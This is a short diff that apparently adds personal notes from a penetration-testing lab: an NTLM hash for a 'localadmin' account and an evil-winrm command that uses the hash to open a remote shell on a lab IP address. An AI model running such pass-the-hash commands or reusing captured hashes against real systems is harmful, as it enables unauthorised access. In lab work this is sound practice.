@@ -1,0 +1,5 @@
+aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae
+
+
+connect using evil-winrm 
+evil-winrm -i 10.129.231.40 -u localadmin -H "9aa582783780d1546d62f2d102daefae"
